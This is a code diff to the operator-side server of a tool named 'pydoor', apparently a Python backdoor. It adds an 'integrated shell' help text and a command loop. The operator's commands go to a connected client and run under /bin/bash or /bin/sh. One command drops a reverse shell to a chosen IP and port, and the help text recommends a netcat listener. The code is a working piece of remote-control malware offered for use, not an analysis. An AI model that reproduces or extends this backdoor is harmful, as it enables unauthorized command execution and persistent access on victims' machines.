@@ -12,6 +12,20 @@ class Server:
         self.sock = 0
         self.con = 0
         self.host = 0
+        self.cmd = 0
+        self.usage = """
+pydoor integrated shell help.
+
+
+sleep | Break the connection with the client, but the client will still run and wait for a server. 
+quit | Kills the client and the server.
+shell [ip] [port]  | Drop a reverse shell to the ip and port specified depending on your current shell, it is recommended to send it to a netcat listener.
+setshell [absolute/path/to/shell] | Change the shell that the integrated shell will be wrapped around.       
+
+**Running any other command will make the client attempt to run it with /bin/bash or /bin/sh, or the shell specified via setshell.
+        
+        
+        """
 
     def handle_response(self, resp):
         if "pydoor.quit" in resp:
@@ -30,6 +44,15 @@ class Server:
             if len(part) < BUFFER:
                 break
         return data
+
+    def preprocesscmd(self):
+
+        if self.cmd == "shellhelp":
+            print(self.usage)
+            return 1
+        else:
+            return 0
+
 
 
     def start(self):
@@ -56,12 +79,17 @@ class Server:
                 
                 print(f"Connection received from client, {self.host} dropping shell")
                 while True:
-                    j = input(">")
-                    if j == "":
+                    self.cmd = input(">")
+                    if self.cmd == "":
                         continue
-                    self.con.send(j.encode())
-                    dat = self.recvall().decode()
-                    self.handle_response(dat.rstrip())
+                    if (self.preprocesscmd() == 0):
+
+                        self.con.send(self.cmd.encode())
+                        dat = self.recvall().decode()
+                        self.handle_response(dat.rstrip())
+
+                    else:
+                        pass
 
                 
 if __name__ == "__main__":
